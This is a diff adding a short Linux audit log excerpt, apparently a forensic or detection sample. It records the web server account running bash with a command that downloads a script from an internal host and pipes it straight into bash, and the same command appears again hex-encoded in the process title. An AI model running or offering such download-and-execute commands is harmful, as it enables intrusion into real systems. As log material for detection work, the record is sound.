@@ -1,0 +1,13 @@
+type=EXECVE msg=audit(1711005512.234:512):
+  argc=3 a0="/bin/bash" a1="-c"
+  a2="curl http://files-gw01.intra-sec.local/update.sh | bash"
+
+type=SYSCALL msg=audit(1711005512.234:512):
+  arch=c000003e syscall=59 success=yes exit=0
+  uid=33 auid=4294967295 gid=33 euid=33 suid=33 fsuid=33
+  comm="bash"
+  exe="/usr/bin/bash"
+  key="web-portal01_cmd_exec"
+
+type=PROCTITLE msg=audit(1711005512.234:512):
+  proctitle=2F62696E2F62617368002D63006375726C20687474703A2F2F66696C65732D677730312E696E7472612D7365632E6C6F63616C2F7570646174652E7368207C2062617368
